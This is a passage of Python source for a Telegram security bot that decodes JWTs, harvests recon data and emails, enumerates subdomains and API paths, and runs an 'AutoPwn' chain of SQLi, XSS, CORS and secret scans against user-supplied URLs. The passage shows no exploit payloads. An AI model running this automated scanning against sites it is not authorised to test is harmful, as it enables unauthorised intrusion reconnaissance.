async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.effective_message.reply_text(
            "🔑 *JWT Attack Tool*\n`/jwtattack <token>`\n\nDecodes and analyzes JWT vulnerabilities",
            parse_mode="Markdown"
        )
        return
    token = context.args[0].strip()
    parts = token.split(".")
    if len(parts) != 3:
        await update.effective_message.reply_text("❌ Invalid JWT format", parse_mode="Markdown")
        return
    def _pad(s):
        return s + "=" * (-len(s) % 4)
    import base64 as _b64
    try:
        header  = json.loads(_b64.urlsafe_b64decode(_pad(parts[0])).decode())
        payload = json.loads(_b64.urlsafe_b64decode(_pad(parts[1])).decode())
    except Exception as e:
        await update.effective_message.reply_text(f"❌ Decode error: `{e}`", parse_mode="Markdown")
        return

    issues = []
    alg = header.get("alg","").upper()
    if alg == "NONE":
        issues.append("🔴 CRITICAL: Algorithm=none (unsigned token accepted)")
    if alg.startswith("HS"):
        issues.append("🟡 MEDIUM: HMAC — may be crackable with weak secret")
    if "exp" not in payload:
        issues.append("🟠 HIGH: No expiration (exp) — token lives forever")
    else:
        exp = payload["exp"]
        if exp < time.time():
            issues.append(f"⚠️ Token expired: `{datetime.fromtimestamp(exp)}`")

    lines = [
        "🔑 *JWT Analysis*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Algorithm: `{alg}`",
        "",
        "*Header:*",
    ]
    for k, v in header.items():
        lines.append(f"  `{k}`: `{v}`")
    lines.append("\n*Payload:*")
    for k, v in list(payload.items())[:15]:
        if k in ("iat","exp","nbf"):
            try:
                dt = datetime.fromtimestamp(int(v)).strftime("%Y-%m-%d %H:%M")
                lines.append(f"  `{k}`: `{v}` ({dt})")
                continue
            except Exception:
                pass
        lines.append(f"  `{k}`: `{str(v)[:60]}`")
    if issues:
        lines.append("\n*⚠️ Security Issues:*")
        for i in issues:
            lines.append(f"  {i}")
    else:
        lines.append("\n✅ No obvious vulnerabilities")
    await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 🕵️  RECON COMMAND  —  All recon combined
# ═══════════════════════════════════════════════════════════
async def _async_headers_recon(url: str) -> dict:
    r = await async_fetch(url, timeout=12)
    if not r:
        return {"error": "Failed to fetch"}
    SECURITY_HEADERS = [
        "Strict-Transport-Security","Content-Security-Policy","X-Frame-Options",
        "X-XSS-Protection","X-Content-Type-Options","Referrer-Policy",
        "Permissions-Policy","Cross-Origin-Opener-Policy","Feature-Policy",
    ]
    return {
        "status":   r["status"],
        "server":   r["headers"].get("Server",""),
        "headers":  {k: v for k, v in r["headers"].items()},
        "missing":  [h for h in SECURITY_HEADERS if h not in r["headers"]],
        "present":  [h for h in SECURITY_HEADERS if h in r["headers"]],
        "cookies":  r["headers"].get("Set-Cookie",""),
        "redirect": r["url"] if r["url"] != url else "",
    }

async def _async_whois(domain: str) -> str:
    """Run whois in executor."""
    loop = asyncio.get_running_loop()
    def _sync():
        try:
            import subprocess
            result = subprocess.run(["whois", domain], capture_output=True, text=True, timeout=15)
            out = result.stdout
            lines = [l for l in out.splitlines() if l.strip() and not l.startswith("%")][:25]
            return "\n".join(lines)
        except Exception as e:
            return f"whois error: {e}"
    return await loop.run_in_executor(None, _sync)

async def _async_robots(url: str) -> str:
    p    = urlparse(url)
    base = f"{p.scheme}://{p.netloc}"
    r    = await async_fetch(f"{base}/robots.txt", timeout=8)
    return r["text"][:2000] if r and r["status"] == 200 else "robots.txt not found"

async def _async_links(url: str) -> dict:
    r = await async_fetch(url, timeout=12)
    if not r:
        return {"internal": [], "external": [], "emails": []}
    soup = BeautifulSoup(r["text"], _BS)
    base_host = urlparse(url).hostname
    internal, external, emails = [], [], []
    for a in soup.find_all("a", href=True):
        href = a["href"].strip()
        if href.startswith("mailto:"):
            emails.append(href[7:])
        elif href.startswith("http"):
            if urlparse(href).hostname == base_host:
                internal.append(href)
            else:
                external.append(href)
        elif href.startswith("/"):
            internal.append(urljoin(url, href))
    return {
        "internal": list(set(internal))[:30],
        "external": list(set(external))[:20],
        "emails":   list(set(emails))[:10],
    }

async def cmd_recon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            "🕵️ *Recon Suite*\n`/recon https://example.com`\n\n"
            "Includes: Headers, Security headers, Cookies,\n"
            "Whois, robots.txt, Links & emails",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ `{_active_scans[uid]}` running", parse_mode="Markdown")
        return
    _active_scans[uid] = "Recon"
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"🕵️ *Recon — `{domain}`*\n\n⏳ Running parallel recon...", parse_mode="Markdown"
    )
    try:
        headers_d, whois_txt, robots_txt, links_d = await asyncio.gather(
            _async_headers_recon(url),
            _async_whois(domain),
            _async_robots(url),
            _async_links(url),
        )
    except Exception as e:
        await safe_edit(msg, f"❌ Recon error: `{e}`", parse_mode="Markdown")
        return
    finally:
        _active_scans.pop(uid, None)

    lines = [f"🕵️ *Recon — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━"]

    # Headers
    sc = headers_d.get("status", "?")
    sc_icon = "✅" if sc == 200 else "⚠️"
    lines.append(f"\n{sc_icon} *HTTP Response:* `{sc}`")
    if headers_d.get("server"):
        lines.append(f"🖥 Server: `{headers_d['server']}`")
    if headers_d.get("redirect"):
        lines.append(f"🔀 Redirected to: `{headers_d['redirect'][:60]}`")
    if headers_d.get("cookies"):
        lines.append(f"🍪 Cookies: `{headers_d['cookies'][:80]}`")

    # Security headers
    if headers_d.get("present") or headers_d.get("missing"):
        lines.append(f"\n🔒 *Security Headers:*")
        for h in headers_d.get("present", []):
            lines.append(f"  ✅ `{h}`")
        for h in headers_d.get("missing", []):
            lines.append(f"  ❌ `{h}` — Missing")

    # Robots.txt
    lines.append(f"\n🤖 *robots.txt:*")
    lines.append(f"```\n{robots_txt[:300]}\n```")

    # Links
    lines.append(f"\n🔗 *Links:* {len(links_d['internal'])} internal | {len(links_d['external'])} external")
    if links_d["emails"]:
        lines.append(f"📧 *Emails:* `{'`, `'.join(links_d['emails'][:5])}`")
    if links_d["external"][:5]:
        lines.append(f"\n🌍 *External Links (top 5):*")
        for lnk in links_d["external"][:5]:
            lines.append(f"  `{lnk[:70]}`")

    # Whois
    lines.append(f"\n📋 *Whois (snippet):*")
    lines.append(f"```\n{whois_txt[:400]}\n```")

    await split_send(msg, context, "\n".join(lines), update.effective_chat.id)

# ═══════════════════════════════════════════════════════════
# 🔍  SCAN COMMAND  —  Quick security overview
# ═══════════════════════════════════════════════════════════
async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            "🔍 *Quick Security Scan*\n`/scan https://example.com`\n\n"
            "Runs: Headers + TechStack + Security headers check",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ `{_active_scans[uid]}` running", parse_mode="Markdown")
        return
    _active_scans[uid] = "Scan"
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"🔍 *Scan — `{domain}`*\n\n⏳ Running security checks...", parse_mode="Markdown"
    )
    try:
        tech_d, headers_d = await asyncio.gather(
            _async_techstack(url),
            _async_headers_recon(url),
        )
    except Exception as e:
        await safe_edit(msg, f"❌ Scan error: `{e}`", parse_mode="Markdown")
        return
    finally:
        _active_scans.pop(uid, None)

    lines = [f"🔍 *Security Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━"]
    sc     = headers_d.get("status","?")
    lines.append(f"Status: `{sc}` | Server: `{tech_d.get('server','?')}`")
    lines.append(f"Response: `{tech_d.get('response_time_ms','?')}ms`")

    if tech_d.get("detected"):
        lines.append("\n🔬 *Tech Stack:*")
        for cat, techs in tech_d["detected"].items():
            lines.append(f"  {cat}: `{'`, `'.join(techs)}`")

    if headers_d.get("missing"):
        lines.append(f"\n❌ *Missing Security Headers:*")
        RISK = {
            "Content-Security-Policy": "🔴 HIGH — XSS risk",
            "Strict-Transport-Security": "🟠 MEDIUM — HTTPS not enforced",
            "X-Frame-Options": "🟡 MEDIUM — Clickjacking risk",
            "X-Content-Type-Options": "🟡 LOW",
        }
        for h in headers_d["missing"]:
            risk = RISK.get(h, "🟡 LOW")
            lines.append(f"  {risk}: `{h}`")

    if headers_d.get("present"):
        lines.append(f"\n✅ *Present Security Headers:*")
        for h in headers_d["present"]:
            lines.append(f"  ✅ `{h}`")

    lines.append("\n💡 _Use specific scanners for deeper analysis_")
    lines.append("  `/sqli` `/xss` `/ssti` `/cors` `/secretscan` `/ssltls`")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# ⚡  AUTOPWN  —  Automated pentest chain
# ═══════════════════════════════════════════════════════════
async def cmd_autopwn(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            "⚡ *AutoPwn — Automated Pentest Chain*\n`/autopwn https://example.com`\n\n"
            "*7 Phases:*\n"
            "① Tech Fingerprint\n② Headers & SSL\n③ Secret Scan\n"
            "④ SQLi Test\n⑤ XSS Test\n⑥ CORS Test\n⑦ Report\n\n"
            "⚠️ Authorized testing only",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ `{_active_scans[uid]}` running", parse_mode="Markdown")
        return
    _active_scans[uid] = "AutoPwn"
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"⚡ *AutoPwn — `{domain}`*\n\n`Phase 1/7` — Tech Fingerprint...", parse_mode="Markdown"
    )
    report = {"domain": domain, "url": url, "findings": [], "timestamp": datetime.now().isoformat()}

    async def _update(phase: int, txt: str):
        try:
            await safe_edit(msg,
                f"⚡ *AutoPwn — `{domain}`*\n\n`Phase {phase}/7` — {txt}",
                parse_mode="Markdown")
        except Exception:
            pass

    try:
        await _update(1, "Tech Fingerprint")
        tech = await _async_techstack(url)
        report["tech"] = tech.get("detected",{})

        await _update(2, "Headers & SSL check")
        headers = await _async_headers_recon(url)
        report["missing_headers"] = headers.get("missing",[])

        await _update(3, "Secret Scan (JS files)")
        secrets = await _async_secretscan(url)
        report["secrets_found"] = secrets.get("total_found", 0)

        await _update(4, "SQL Injection Test")
        sqli = await _async_sqli(url)
        if sqli.get("vulnerable"):
            report["findings"].append({"type":"SQLi","severity":"CRITICAL","details":sqli["findings"][:2]})

        await _update(5, "XSS Test")
        xss = await _async_xss(url)
        if xss.get("vulnerable"):
            report["findings"].append({"type":"XSS","severity":"HIGH","details":xss["findings"][:2]})

        await _update(6, "CORS Misconfiguration")
        cors = await _async_cors(url)
        if cors.get("misconfigs"):
            report["findings"].append({"type":"CORS","severity":"HIGH","details":cors["misconfigs"][:2]})

    except asyncio.CancelledError:
        await safe_edit(msg, "🛑 AutoPwn cancelled", parse_mode="Markdown")
        return
    except Exception as e:
        logger.error("AutoPwn error: %s", e)
    finally:
        _active_scans.pop(uid, None)

    # Report
    total_findings = len(report["findings"])
    risk = "🔴 HIGH RISK" if total_findings >= 3 else ("🟠 MEDIUM" if total_findings >= 1 else "✅ Clean")
    lines = [
        f"⚡ *AutoPwn Report — `{domain}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Overall Risk: {risk}",
        f"Vulnerabilities found: `{total_findings}`",
        f"Secrets exposed: `{report.get('secrets_found',0)}`",
        f"Missing sec headers: `{len(report.get('missing_headers',[]))}`",
        "",
    ]
    if report["findings"]:
        lines.append("*🔴 Vulnerabilities:*")
        for f in report["findings"]:
            lines.append(f"  {f['type']} — `{f['severity']}`")
    if report.get("tech"):
        tech_flat = [t for techs in report["tech"].values() for t in techs]
        lines.append(f"\n*🔬 Tech:* `{'`, `'.join(tech_flat[:6])}`")
    lines.append("\n⚠️ _Authorized testing only_")

    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")
    rj = json.dumps(report, indent=2, default=str, ensure_ascii=False)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=io.BytesIO(rj.encode()),
        filename=f"autopwn_{re.sub(r'[^\w]','_',domain)}_{ts}.json",
        caption=f"⚡ AutoPwn Report | {domain} | `{total_findings}` findings",
        parse_mode="Markdown"
    )

# ═══════════════════════════════════════════════════════════
# 🔍  DISCOVER COMMAND  —  API + Subdomain discovery
# ═══════════════════════════════════════════════════════════
_COMMON_API_PATHS = [
    "/api", "/api/v1", "/api/v2", "/api/v3", "/graphql",
    "/swagger.json", "/openapi.json", "/api/docs", "/api/swagger",
    "/.well-known/openid-configuration", "/oauth/token",
    "/rest/api/2", "/wp-json/wp/v2", "/api/users",
    "/api/auth", "/api/login", "/api/products", "/api/orders",
    "/api/search", "/api/health", "/api/status", "/api/config",
    "/admin/api", "/v1/users", "/v1/auth", "/v2/users",
]

async def _async_discover_api(url: str, progress_cb=None) -> dict:
    base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    found = []
    urls_to_test = [base + p for p in _COMMON_API_PATHS]

    def progress(m):
        if progress_cb:
            progress_cb(m)

    progress(f"🔌 Testing {len(urls_to_test)} API paths...")
    results = await async_fetch_many(urls_to_test, timeout=8, concurrency=20)

    for path, r in zip(_COMMON_API_PATHS, results):
        if not r:
            continue
        status = r["status"]
        ct     = r.get("content_type","")
        text   = r["text"]
        if status in (200, 201, 204):
            ep_type = "JSON_API" if "json" in ct else ("GRAPHQL" if "graphql" in path else "API")
            found.append({
                "url": base + path, "path": path,
                "status": status, "type": ep_type,
                "preview": text[:100].replace("\n"," "),
            })
        elif status in (401, 403):
            found.append({
                "url": base + path, "path": path,
                "status": status, "type": "PROTECTED",
                "preview": "",
            })

    # Mine from HTML
    r0 = await async_fetch(url, timeout=10)
    mined = []
    if r0:
        soup = BeautifulSoup(r0["text"], _BS)
        for tag in soup.find_all("script"):
            src = tag.get("src","")
            if src:
                mined.append(urljoin(url, src))
        for m in re.finditer(r'["\`](/api/[^"\'`<>\s]+)', r0["text"]):
            mined.append(urljoin(url, m.group(1)))

    return {"endpoints": found, "mined": list(set(mined))[:30]}

async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            f"🔎 *API Discovery*\n`/discover https://example.com`\n\n"
            f"Tests `{len(_COMMON_API_PATHS)}` known API paths + HTML mining",
            parse_mode="Markdown"
        )
        return
    url = context.args[0].strip()
    if not url.startswith("http"):
        url = "https://" + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ `{_active_scans[uid]}` running", parse_mode="Markdown")
        return
    _active_scans[uid] = "Discover"
    domain = urlparse(url).hostname
    msg    = await update.effective_message.reply_text(
        f"🔎 *API Discovery — `{domain}`*\n\n⏳ Testing paths...", parse_mode="Markdown"
    )
    progress_msgs = []
    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_msgs:
                try:
                    await safe_edit(msg,
                        f"🔎 *Discover — `{domain}`*\n\n{progress_msgs[-1]}", parse_mode="Markdown")
                    progress_msgs.clear()
                except Exception:
                    pass
    prog = asyncio.create_task(_prog())
    try:
        async with scan_semaphore:
            data = await _async_discover_api(url, lambda t: progress_msgs.append(t))
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    endpoints = data["endpoints"]
    mined     = data["mined"]
    open_eps  = [e for e in endpoints if e["status"] == 200]
    protected = [e for e in endpoints if e["status"] in (401, 403)]

    lines = [
        f"🔎 *API Discovery — `{domain}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Found: `{len(open_eps)}` open | `{len(protected)}` protected | Mined: `{len(mined)}`",
    ]
    if open_eps:
        lines.append(f"\n*✅ Open Endpoints ({len(open_eps)}):*")
        for e in open_eps[:15]:
            lines.append(f"  🟢 `{e['path']}` [{e['type']}]")
            if e["preview"]:
                lines.append(f"     _{e['preview'][:60]}_")
    if protected:
        lines.append(f"\n*🔒 Protected ({len(protected)}):*")
        for e in protected[:10]:
            lines.append(f"  🔐 `{e['path']}` [{e['status']}]")
    if mined:
        lines.append(f"\n*🕵️ Mined URLs (top 10):*")
        for m in mined[:10]:
            lines.append(f"  `{urlparse(m).path[:60]}`")
    lines.append("\n⚠️ _Passive scan only_")
    await split_send(msg, context, "\n".join(lines), update.effective_chat.id)

    # JSON export
    rj = json.dumps(data, indent=2, default=str, ensure_ascii=False)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=io.BytesIO(rj.encode()),
        filename=f"api_{re.sub(r'[^\w]','_',domain)}_{ts}.json",
        caption=f"🔎 API Report | {domain} | `{len(open_eps)}` open endpoints",
        parse_mode="Markdown"
    )

# ═══════════════════════════════════════════════════════════
# 📋  SUBDOMAINS
# ═══════════════════════════════════════════════════════════
async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_force_join(update, context):
        return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode="Markdown")
        return
    if not context.args:
        await update.effective_message.reply_text(
            "🌐 *Subdomain Finder*\n`/subdomains example.com`",
            parse_mode="Markdown"
        )
        return
    domain = context.args[0].strip().replace("https://","").replace("http://","").split("/")[0]
    safe_ok, reason = is_safe_url(f"https://{domain}")
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown")
        return
    msg = await update.effective_message.reply_text(
        f"🌐 *Subdomain Finder — `{domain}`*\n\n⏳ Scanning...", parse_mode="Markdown"
    )
    WORDLIST = [
        "www","mail","ftp","localhost","webmail","smtp","pop","ns1","ns2","webdisk",
        "www2","admin","vpn","m","shop","blog","dev","staging","api","app","portal",
        "forum","test","git","gitlab","jenkins","monitor","dashboard","cpanel",
        "whm","cdn","static","media","images","img","assets","docs","support","help",
        "status","beta","alpha","mobile","secure","login","auth","sso","oauth","id",
    ]
    found = []
    async def _check(sub: str):
        fqdn = f"{sub}.{domain}"
        try:
            loop = asyncio.get_running_loop()
            ip   = await loop.run_in_executor(None, socket.gethostbyname, fqdn)
            r    = await async_fetch(f"https://{fqdn}", timeout=6)
            status = r["status"] if r else "N/A"
            found.append({"sub": fqdn, "ip": ip, "status": status})
        except Exception:
            pass

    tasks = [_check(s) for s in WORDLIST]
    await asyncio.gather(*tasks)
    found.sort(key=lambda x: x["sub"])

    lines = [
        f"🌐 *Subdomains — `{domain}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Found: `{len(found)}` / `{len(WORDLIST)}` tested",
        "",
    ]
    for s in found[:30]:
        sc   = s.get("status","?")
        icon = "✅" if sc == 200 else ("🔒" if sc in (401,403) else "⚠️")
        lines.append(f"  {icon} `{s['sub']}` → `{s['ip']}` [{sc}]")
    if not found:
        lines.append("❌ No subdomains found in wordlist")
    await safe_edit(msg, "\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 🖥  SCREENSHOT (via html2image fallback)
# ═══════════════════════════════════════════════════════════
async def cmd_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.effective_message.reply_text(
        "📸 *Screenshot Tool*\n\n"
        "⚠️ Puppeteer not configured on this deployment.\n"
        "Use `/recon <url>` for headers or `/techstack <url>` for tech info.",
        parse_mode="Markdown"
    )

# ═══════════════════════════════════════════════════════════
# 📊  STATUS & HISTORY
# ═══════════════════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    uname = update.effective_user.first_name or "User"
    async with db_lock:
        loop = asyncio.get_running_loop()
        db   = await loop.run_in_executor(None, _load_db_sync)
        u    = get_user(db, uid, uname)
        reset_daily(u)
        await loop.run_in_executor(None, _save_user_sync, str(uid), u)

    used    = u["count_today"]
    lim     = get_limit(db, u)
    lim_str = "∞" if lim == 0 else str(lim)
    is_adm  = uid in ADMIN_IDS

    kb_rows = [
        [InlineKeyboardButton("📥 Download",     callback_data="help_dl"),
         InlineKeyboardButton("🔍 Scan",         callback_data="help_scan")],
        [InlineKeyboardButton("🕵️ Recon",        callback_data="help_recon"),
         InlineKeyboardButton("🔎 Discover",     callback_data="help_discover")],
        [InlineKeyboardButton("⚡ Advanced",     callback_data="help_advanced"),
         InlineKeyboardButton("📊 My Stats",     callback_data="help_account")],
    ]
    if is_adm:
        kb_rows.append([InlineKeyboardButton("👑 Admin", callback_data="help_admin")])

    await update.effective_message.reply_text(
        f"👋 *မင်္ဂလာပါ, {uname}!*\n"
        f"🛡 *CyberRecon Bot v31.0*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📅 Today: `{used}/{lim_str}` downloads\n"
        f"🔒 SSRF Protected | ⚡ 100% Async\n\n"
        f"*Available Scanners:*\n"
        f"`/sqli` `/xss` `/ssti` `/cors` `/lfi`\n"
        f"`/secretscan` `/ssltls` `/techstack` `/cloudcheck`\n"
        f"`/autopwn` → Full automated pentest\n\n"
        f"_Category ကို နှိပ်ပြီး commands ကြည့်ပါ ↓_",
        reply_markup=InlineKeyboardMarkup(kb_rows),
        parse_mode="Markdown"
    )

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb_rows = [
        [InlineKeyboardButton("📥 Download",  callback_data="help_dl"),
         InlineKeyboardButton("🔍 Scan",      callback_data="help_scan")],
        [InlineKeyboardButton("🕵️ Recon",     callback_data="help_recon"),
         InlineKeyboardButton("🔎 Discover",  callback_data="help_discover")],
        [InlineKeyboardButton("⚡ Advanced",  callback_data="help_advanced"),
         InlineKeyboardButton("📊 Account",   callback_data="help_account")],
        [InlineKeyboardButton("👑 Admin",     callback_data="help_admin")],
    ]
    await update.effective_message.reply_text(
        "📖 *Help — Category ရွေးပါ*",
        reply_markup=InlineKeyboardMarkup(kb_rows),
        parse_mode="Markdown"
    )

_HELP_PAGES = {
    "help_dl": (
        "📥 *Download Commands*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/dl <url>` — Download website\n"
        "  └ Single Page / Full Site / JS modes\n"
        "`/resume` — Resume failed download\n"
        "`/stop` — Cancel current operation\n"
        "`/history` — Download history"
    ),
    "help_scan": (
        "🔍 *Security Scanners*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/scan <url>` — Quick security overview\n"
        "`/sqli <url?param=1>` — SQL Injection\n"
        "`/xss <url?q=test>` — XSS Scanner\n"
        "`/ssti <url?name=x>` — Template Injection\n"
        "`/cors <url>` — CORS Misconfiguration\n"
        "`/lfi <url?file=x>` — LFI Scanner\n"
        "`/openredirect <url>` — Open Redirect\n"
        "`/secretscan <url>` — API Key Finder\n"
        "`/ssltls <domain>` — SSL/TLS Grade\n\n"
        "⚠️ _Authorized testing only_"
    ),
    "help_recon": (
        "🕵️ *Recon Tools*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/recon <url>` — Full recon suite\n"
        "  └ Headers, Whois, robots.txt, Links\n"
        "`/techstack <url>` — Tech fingerprint\n"
        "`/cloudcheck <domain>` — Real IP finder\n"
        "`/subdomains <domain>` — Subdomain finder\n"
        "`/ssltls <domain>` — SSL scanner"
    ),
    "help_discover": (
        "🔎 *Discovery Tools*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/discover <url>` — API endpoint discovery\n"
        f"  └ Tests {len(_COMMON_API_PATHS)} known paths\n"
        "`/subdomains <domain>` — Subdomain enum"
    ),
    "help_advanced": (
        "⚡ *Advanced Tools*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/autopwn <url>` — Automated pentest (7 phases)\n"
        "`/jwtattack <token>` — JWT decoder & vuln check\n"
        "`/secretscan <url>` — Deep secret/API key scan\n"
        "`/cloudcheck <domain>` — CDN bypass / real IP"
    ),
    "help_account": (
        "📊 *Account*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/status` — Your usage stats\n"
        "`/history` — Download history\n"
        "`/mystats` — Full statistics\n"
        "`/stop` — Cancel running operation"
    ),
    "help_admin": (
        "👑 *Admin Commands*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        "`/admin` — Admin panel\n"
        "`/sys` — System status\n"
        "`/sys clean` — Cleanup files\n"
        "`/sys logs [n]` — View logs\n\n"
        "`/adminset limit <n>` — Daily limit (0=∞)\n"
        "`/ban <id>` `/unban <id>`\n"
        "`/userinfo <id>`\n"
        "`/broadcast <msg>`\n"
        "`/allusers`\n"
        "`/setforcejoin`"
    ),
}

_BACK_KB = InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Back", callback_data="help_back")]])

async def help_category_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data  = query.data
    uid   = query.from_user.id

    if data == "help_back":
        await cmd_help(update, context)
        return

    if data == "help_admin" and uid not in ADMIN_IDS:
        await query.answer("🚫 Admin only", show_alert=True)
        return

    page = _HELP_PAGES.get(data)
    if page:
        await query.edit_message_text(page, reply_markup=_BACK_KB, parse_mode="Markdown")

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    loop = asyncio.get_running_loop()
    db   = await loop.run_in_executor(None, _load_db_sync)
    u    = get_user(db, uid, update.effective_user.first_name)
    reset_daily(u)
    lim  = get_limit(db, u)
    used = u["count_today"]
    bar  = pbar(used, lim if lim > 0 else max(used, 1))
    await update.effective_message.reply_text(
        f"📊 *Account Status*\n━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 {u['name']}\n"
        f"🚫 Banned: {'Yes ❌' if u['banned'] else 'No ✅'}\n\n"
        f"📅 *Today:*\n`{bar}`\n"
        f"Used: `{used}` / `{'∞' if lim==0 else lim}`\n\n"
        f"📦 Total downloads: `{u['total_downloads']}`\n"
        f"🔍 Total scans: `{u['total_scans']}`",
        parse_mode="Markdown"
    )

async def cmd_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    loop = asyncio.get_running_loop()
    db   = await loop.run_in_executor(None, _load_db_sync)
    u    = get_user(db, uid)
    dls  = u.get("downloads",[])[-10:]
    if not dls:
        await update.effective_message.reply_text("📭 History မရှိသေးပါ")
        return
    lines = ["📜 *Download History*\n"]
    for d in reversed(dls):
        icon = {"success":"✅","too_large":"⚠️"}.get(d.get("status",""),"❌")
        lines.append(f"{icon} `{d.get('url','?')[:45]}`")
        lines.append(f"   {d.get('time','?')} | {d.get('size_mb','?')}MB\n")
    await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown")

async def cmd_mystats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    loop = asyncio.get_running_loop()
    db   = await loop.run_in_executor(None, _load_db_sync)
    u    = get_user(db, uid)
    hist = u.get("scan_history", [])[-10:]
    lines = [
        f"📊 *My Stats — `{u['name']}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"📦 Total downloads: `{u.get('total_downloads',0)}`",
        f"🔍 Total scans: `{u.get('total_scans',0)}`",
    ]
    if hist:
        lines.append("\n*🔍 Recent Scans:*")
        for s in reversed(hist):
            lines.append(f"  `{s.get('type','?')}` → `{s.get('target','?')}` ({s.get('time','?')})")
    await update.effective_message.reply_text("\n".join(lines), parse_mode="Markdown")

# ═══════════════════════════════════════════════════════════
# 👑  ADMIN COMMANDS
# ═══════════════════════════════════════════════════════════
@admin_only
async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    loop = asyncio.get_running_loop()
    db   = await loop.run_in_executor(None, _load_db_sync)
    tot  = len(db["users"])
    ban  = sum(1 for u in db["users"].values() if u.get("banned"))
    kb   = InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 All Users",   callback_data="adm_users"),
         InlineKeyboardButton("📊 Stats",       callback_data="adm_stats")],
        [InlineKeyboardButton("🔴 Disable Bot", callback_data="adm_disable"),
         InlineKeyboardButton("🟢 Enable Bot",  callback_data="adm_enable")],
    ])
